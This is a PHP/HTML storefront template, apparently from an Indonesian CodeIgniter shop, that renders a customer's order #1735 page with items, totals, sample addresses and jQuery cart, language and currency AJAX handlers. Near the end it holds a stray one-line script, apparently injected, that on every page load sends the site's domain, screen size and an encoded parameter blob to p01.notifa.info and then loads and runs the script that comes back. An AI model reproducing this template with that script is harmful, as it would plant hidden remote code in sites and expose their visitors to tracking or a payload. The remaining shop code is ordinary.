<!--Default-->

<!DOCTYPE html>
<html lang="en">
    
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>

        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
                <meta name="author" content="BDTASK">
        <meta name="description" content="">

        <title>Costumer</title>
   
        <!-- Favicons --> 
        <link rel="icon" type="image/png" href="<?php echo base_url().'my-assets/image/logo/b561929d20e2e5728e05d4f0bbafe7f7.png'?>">
        
        <!-- Bootstrap core CSS -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
        <!-- Bootstrap core CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/bootstrap/css/bootstrap.min.css'?>" rel="stylesheet">  
        
        <!-- FontAwesome Icon CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/font-awesome/css/font-awesome.min.css'?>" rel="stylesheet" type="text/css"> 
        
        <!-- Jquery UI CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.css'?>" rel="stylesheet"> 
        
        <!-- Owl Carousel CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.css'?>" rel="stylesheet">
        
        <!-- Animate CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/wow-js/animate.css'?>" rel="stylesheet"> 
        
        <!-- Lightbox CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/lightbox/css/lightbox.min.css'?>" rel="stylesheet"> 

        <!-- Custom styles for this template -->
        <link href="<?php echo base_url().'assets/website/css/style.css'?>" rel="stylesheet"> 
        <!-- EasyZoom CSS -->
        <link rel="stylesheet" href="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.css'?>">

        <!-- Responsive Style -->
        <link href="<?php echo base_url().'assets/website/css/responsive.css'?>" rel="stylesheet">

        <!-- Include SmartWizard CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard.css'?>" rel="stylesheet" type="text/css">

        <!-- Optional SmartWizard theme -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard_theme_dots.css'?>" rel="stylesheet" type="text/css">

        <!-- Jquery  -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery/jquery-3.2.1.min.js'?>" type="text/javascript"></script>

        <!-- jquery-ui.min.js -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.js'?>" type="text/javascript"></script>
        
        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->


        <style type="text/css">
            .slider_area .slider_inner.home2_slider{
                margin-left: 0px; 
            }
            
            .slider_style .owl-nav{
                top:60px;
               
            }
            .discount{
                background-color:#20C507;
                padding: 10px;
                    
                
            }
            .shadow {
               -moz-box-shadow:    inset 0 0 10px #000000;
               -webkit-box-shadow: inset 0 0 10px #000000;
               box-shadow:         inset 0 0 10px #000000;
            }
            .pading-diskon{
                background: #20C50E;
                padding-left:41px;
                padding-right:41px;
            }
            .slider_style .owl-nav .owl-prev {
    border-radius: 50px;
    left: 22rem;
    display: inline-block;
    width: 30px;
    height: 30px;
    line-height: 30px;
    border: 1px solid #000;
    margin: 0px 1095px;
    transition: all 300ms linear 0s;
    margin-left: -50px;
            }
            
            .slider_style .owl-nav {
    text-align: center;
    top: 91px;
    position: absolute;
    right: -37px;
                
            }
            .btn-kanan{
                float: right;
                height: 50px;
            }
            .btn-kanan:hover{
                color:white;
                background: black;
            }
            th{
                background: #928d8d;
                color: white;
                text-align: center;
            }
            
            .bg_red{
              color: white;
              background: red;
            }
            .bg_blue{
              color: white;
              background: blue;
            }
            .bg_yellow{
              color: white;
              background: yellow;
            }
            .bg_green{
              color: white;
              background: green;
            }
            .center{
                    text-align: center;
            }
            
            td{
                padding: 35px;
               border-bottom: 2px #b7b7b7 solid;
            }
            .radius{
                border-radius: 50px;
            }
            
            .table td, .table th{
                vertical-align: middle;
            }
            
            .max200{
                
                max-height:200px; 
                
            }
            
            
            
        </style>

     
    
    </head>

    <body>
        <!--==== Preloader =======-->
        <div class="preloader"></div>

        <!--========== Header Top Area ==========-->
       <?php      $this->load->view('header_top');             ?> 
        <!--========== End Header Top Area ==========-->
        
        <!--====== Header Area ======-->
<header>
    <!-- Main Header Area -->
   <?php      $this->load->view('header_main');             ?> 
    

   
</header>
<!--===== End Header Area =======-->

    <style type="text/css">
        input.loading {
            background: #fff url(assets/website/image/resize.gif) no-repeat center !important;
        }
    </style>

    <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
        
        //Product search by product name
        $('body').on('keyup', '#product_name', function() {

            var product_name = $('#product_name').val();
            var category_id  = $('#select_category').val();

            //Product name check
            if (product_name == 0) {
                $('.search_results').html(' ');
                return false;
            }
            
            $.ajax({
                type: "post",
                async: false,
                url: 'http://isshue.bdtask.com/isshue-v1.5/website/Category/category_product_search_ajax',
                data: {product_name: product_name,category_id:category_id},
                beforeSend: function(){
                    $('#product_name').addClass('loading');
                },
                success: function(data) {
                    $('#product_name').removeClass('loading');
                    if (data) {
                        $('.search_results').html(data);
                    }
                },
                error: function() {
                    alert('Request Failed, Please check your code and try again!');
                }
            });
        });
    </script>

<!-- Product delete from cart by ajax -->
<script type="text/javascript">
    $('body').on('click', '.delete_cart_item', function() {
        var row_id  = $(this).attr('name');
        $.ajax({
            type: "post",
            async: true,
            url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/delete_cart/',
            data: {row_id:row_id},
            success: function(data) {
                $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
            },
            error: function() {
                alert('Request Failed, Please check your code and try again!');
            }
        });
    });  
</script>           


<!-- Content  -->
     <center><h1 class="m-5" style="font-size: 4.05rem;">ORDER #1735</h1></center>
   
        <div class="container-fluid">
        <div class="row">
            <div class="col-md-8 m10 col-xs-12 order-2" style=" margin:10px;">
                <div class="container">
                          <h4>Order #1735 was placed on 22/06/2013 and is currently Being prepared.

                            </h4>
                                    
                          <table class="table table-hover center">
                            <thead>
                              <tr>
                                
                                <th colspan="2">ITEM</th>
                                <th>PRICE</th>
                                <th>QUANTITY</th>
                                <th>TOTAL</th>
                              </tr>
                            </thead>
                            <tbody>
                              <tr>
                                <td><img src="http://www.scat-technology.com/images/breakers/gv2me10.jpg" class="img-fluid max200" alt="Responsive image"></td>
                                <td>GV2ME10</td>
                                <td>Rp.150.000</td>
                                <td>1</td>
                                <td>Rp.150.000</td>
                                
                              </tr>
                              <tr>
                                <td><img src="https://cdn.tracepartsonline.net/PartsDefs/Production/SCHNEIDER_ELECTRIC/10-24112011-116432/Pictures/10-24112011-116432L.gif" class="img-fluid max200" alt="Responsive image"></td>
                                <td> GV2RT</td>
                                <td>Rp.250.000</td>
                                <td>2</td>
                                <td>Rp.500.000</td>
                               
                              </tr>
                            </tbody>
                          </table>
                  </div>
                
            </div>
            <div class="col-md-3 col-xs-12 order-1 order-md-2" style=" margin:10px; background:#fafafa; padding:10px; min-height:500px;">
            <div class="col-md-12 center" >
                <img src="http://demo.solwininfotech.com/wordpress/veriyas-pro/wp-content/uploads/2016/05/John-Doe.jpg" class="img-thumbnail" style="max-height:200px;" >
               <p><b>John Doe</b></p>
               <p>Bekasi,Indonesia</p>
                </div> 
                <div class="col-md-12 center">
                <ul class="list-group ">
                    
                      <li class="list-group-item d-flex justify-content-between align-items-center list-group-item-action"> Order
                            <span class="badge badge-primary badge-pill">3</span>
                      </li>
                    
                      <li class="list-group-item d-flex justify-content-between align-items-center list-group-item-action"> Profile
                           <!-- <span class="badge badge-primary badge-pill">12</span>-->
                      </li>
                    
                    <li class="list-group-item d-flex justify-content-between align-items-center list-group-item-action">logout</li>
                           
                     
                    </ul>
                </div>
            
            
            </div>
        
        </div>
    </div>
  <!--2-->
        
        <div class="container">
        <div class="row">
          
            <div class="col-md-5 offset-md-1" style="  background:#fafafa; padding:20px; min-height:500px;">
            <div class="col-md-12 " >
                
               <h2><b>ORDER SUMMARY</b></h2>
               <p>Shipping and additional costs are calculated based on values you have entered.</p>
                </div> 
                <div class="col-md-12 p-2">
                <table>
                    <tr>
                    <td>Order Subtotal
                    </td>
                    <td>Rp.750.000-,</td>
                </tr>
                    <tr>
                    <td>Shipping And Handling</td>
                    <td>Rp.10.000-,</td>
                </tr>
                    <tr>
                    <td>Tax</td>
                    <td>Rp.0-,</td>
                </tr>
                    <tr>
                    <td>Total</td>
                    <td><h4>Rp.760.000-,</h4></td>
                </tr></table>
                </div>
            
            
            </div>
            <div class="col-md-5" style="  background:#fafafa; padding:20px; min-height:500px;">
                
                <div class="col-md-12 " >
                
                    <h3><b>INVOICE ADDRESS</b><hr></h3>
               
                </div>
                <div class="p-1">
                    <p>John Doe</p>
                    <p>0897-512-8532</p>
                    <p>Galaxy,Bekasi</p>
                    <p>RSK6/5</p>
                    <p>17110</p>
                    <p><b>Indonesia</b></p>
                </div>
                
                <div class="col-md-12 " style="margin-top:60px;" >
                
                    <h3><b>SHIPPING ADDRESS</b><hr></h3>
               
                </div>
                <div class="p-1">
                    <p>John Doe</p>
                    <p>0897-512-8532</p>
                    <p>Galaxy,Bekasi</p>
                    <p>RSK6/5</p>
                    <p>17110</p>
                    <p><b>Indonesia</b></p>
                </div>
            
            
            </div>
        
        </div>
    </div>
  
        
        
        
<!--=========== footer Area ===========-->
 
 <?php      $this->load->view('footer');         

        function rupiah($angka){
    
            echo "Rp " . number_format($angka,2,',','.');
                // return $hasil_rupiah;
         
        } 

  
        function limit_words($string, $word_limit){
            $words = explode(" ",$string);
            return implode(" ",array_splice($words,0,$word_limit));
        }
   ?>  
        
<!--=========== ./footer Area ===========-->




        <!-- Bootstrap  -->
        <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/tether.min.js'?>" type="text/javascript"></script>
        <script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/bootstrap.min.js'?>" type="text/javascript"></script>

        <script type="text/javascript" src="cdnjs.cloudflare.com/ajax/libs/1000hz-bootstrap-validator/0.11.5/validator.min.js'?>"></script>

        <!-- Include SmartWizard JavaScript source -->
        <script type="text/javascript" src="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/js/jquery.smartWizard.min.js'?>"></script>

        <!-- Owl Carousel -->
        <script src="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.js'?>" type="text/javascript"></script>

        <!-- EasyZoom -->
        <script src="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.js'?>" type="text/javascript"></script>

        <!-- DSCount JS -->
        <script src="<?php echo base_url().'assets/website/vendor/dscountdown/dscountdown.min.js'?>" type="text/javascript"></script>
        
        <!-- WoW js -->
        <script src="<?php echo base_url().'assets/website/vendor/wow-js/wow.min.js'?>"></script>
        
        <!-- Lightbox js -->
        <script src="<?php echo base_url().'assets/website/vendor/lightbox/js/lightbox.min.js'?>"></script>  

        <!-- Simple Share js -->
        <script src="<?php echo base_url().'assets/website/js/jquery.simpleSocialShare.min.js'?>"></script>

        <!-- Custom scripts for this template -->
        <script src="<?php echo base_url().'assets/website/js/theme.js'?>"></script>

        <script type="text/javascript">

            //Simple share
            $('.share-button').simpleSocialShare();
            
            //Change language ajax
            $('body').on('change', '#change_language', function() {
                var language  = $('#change_language').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_language',
                    data: {language:language},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Change currency ajax
            $('body').on('change', '#change_currency', function() {
                var currency_id  = $('#change_currency').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_currency',
                    data: {currency_id:currency_id},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Add to cart by ajax
            function add_to_cart(id){
                var product_id = $('#product_id_'+id).val();
                var price      = $('#price_'+id).val();
                var discount   = $('#discount_'+id).val();
                var qnty       = $('#qnty_'+id).val();
                var image      = $('#image_'+id).val();
                var name       = $('#name_'+id).val();
                var model      = $('#model_'+id).val();
                var supplier_price      = $('#supplier_price_'+id).val();
                var cgst      = $('#cgst_'+id).val();
                var cgst_id   = $('#cgst_id_'+id).val();
                var sgst      = $('#sgst_'+id).val();
                var sgst_id   = $('#sgst_id_'+id).val();
                var igst      = $('#igst_'+id).val();
                var igst_id   = $('#igst_id_'+id).val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart',
                    data: {
                        product_id:product_id,
                        price:price,
                        discount:discount,
                        qnty:qnty,
                        image:image,
                        name:name,
                        model:model,
                        supplier_price:supplier_price,
                        cgst:cgst,
                        cgst_id:cgst_id,
                        sgst:sgst,
                        sgst_id:sgst_id,
                        igst:igst,
                        igst_id:igst_id,
                    },
                    beforeSend: function(){
                        $('.preloader').html("<img src='assets/website/image/loader.gif'>");
                    },
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }

            //Add to cart by ajax
            function cart_btn(product_id){
                var qnty       = $('#sst').val();
                var variant    = $('#select_size1').val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                if (qnty <= 0) {
                    alert('Please keep quantity up to zero !');
                    return false;
                }
                if (variant != 'undefine') {
                    if (variant <= 0) {
                        alert('Please select product size !');
                        return false;
                    }
                }
                
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart_details',
                    data: {product_id:product_id,qnty:qnty,variant:variant},
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }
        </script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mN8SBaYYlsFeUcDpnfQuaKJY%2f%2b4ifx7FXqVglW98PVFQvyY7T5Gk6N3jNgEJBhG6GaIzUqsjF%2f4TLSGOEsYplytwPHPHZFO3%2bR6hyaZOWCDQ8NlS%2b7NVfrYlTPyMtYeFvjQ%2fnLSStYmmFKlaYd%2bcyO0NvOwT%2b9o5NpgZK1gmIGgBQxkfGD%2fb9NYJ5IJVImWu%2fqDBvW%2b9q2qM5N6XydmS8ZLD0HEqy8N%2bx3cr7%2f6jh278SYgwY8uZjHU0e6QkQ1T2jY6I1JON1wBuBdTZDw5sy6dgh7d5LWLX4DVb3zDZPQPk6JEqAaM6yvxHaRlLpKWD5Qpu81O%2bLfziK99WRxo5OJNny1p1UL6OtYYO1GSuVvqfajzEcbbhCo5JXOLkOoUYa84r0WrbrcFiNk5r3M5YfMpXZfbTpbsQhGlXzCd9KuM9lq%2brlrbLdjgDkYGjAsQcXf5g4enwoja3mCiFUt1yIbw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
    
    
        <!--timer-->
        
<script>
// Set the date we're counting down to
var countDownDate = new Date("Aug 24, 2018 15:37:25").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

    // Get todays date and time
    var now = new Date().getTime();
    
    // Find the distance between now and the count down date
    var distance = countDownDate - now;
    
    // Time calculations for days, hours, minutes and seconds
    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
    // Output the result in an element with id="demo"
    document.getElementById("demo").innerHTML = days + "d " + hours + "h "
    + minutes + "m " + seconds + "s ";
    
    // If the count down is over, write some text 
    if (distance < 0) {
        clearInterval(x);
        document.getElementById("demo").innerHTML = "EXPIRED";
    }
}, 1000);
</script>
        
        <script>
            $('.discount').owlCarousel({
                margin:10,
                loop:true,
                autoWidth:true,
                items:4,
                 nav: true  ,
             navText : ["<",">"],})
        </script>



        <!-- Add to Card Function -->
        <script type="text/javascript">
            $(document).ready(function(){
                $('.add_cart').click(function(){
                    var produk_id    = $(this).data("produkid");
                    var produk_nama  = $(this).data("produknama");
                    var produk_harga = $(this).data("produkharga");
                    var gambar       = $(this).data("gambar");

                   

                    $.ajax({
                        url : "<?php echo base_url();?>home/add_to_cart",
                        method : "POST",
                        data : {produk_id: produk_id, produk_nama: produk_nama, produk_harga: produk_harga, gambar:gambar},
                        success: function(data){
                            $('#detail_cart').html(data);
                            $('#count_cart').load("<?php echo base_url();?>home/load_count");
                            $('#count_cart_top').load("<?php echo base_url();?>home/load_count_top");

                        }
                    });
                });


                // Hapus Barang
                $('#hapus-session').click(function(){
                    var produk_id    = '';
                    

                 $.ajax({
                        url : "<?php echo base_url();?>home/destroy",
                        method : "POST",
                        
                        // data : {produk_id: produk_id, produk_nama: produk_nama, produk_harga: produk_harga, quantity: quantity,gambar:gambar},
                        success: function(){
                        $('#detail_cart').load("<?php echo base_url();?>index.php/cart/load_cart");
                            
                        $('#count_cart').load("<?php echo base_url();?>index.php/cart/load_count");
                        }
                    });

                });

                // Load shopping cart
                 $('#detail_cart').load("<?php echo base_url();?>home/load_cart");
                 $('#count_cart').load("<?php echo base_url();?>home/load_count");
                 $('#count_cart_top').load("<?php echo base_url();?>home/load_count_top");
                
                //Hapus Item Cart
                $(document).on('click','.hapus_cart',function(){
                    var row_id=$(this).attr("id"); //mengambil row_id dari artibut id
                    $.ajax({
                        url : "<?php echo base_url();?>home/hapus_cart",
                        method : "POST",
                        data : {row_id : row_id},
                        success :function(){
                            // $('#detail_cart').html(data);
                            $('#detail_cart').load("<?php echo base_url();?>home/load_cart");

                            $('#count_cart').load("<?php echo base_url();?>home/load_count");
                             $('#count_cart_top').load("<?php echo base_url();?>home/load_count_top");

                        }
                    });
                });

            });
        </script>
        <!-- End Add to cart -->
        
        
    </body>


</html>
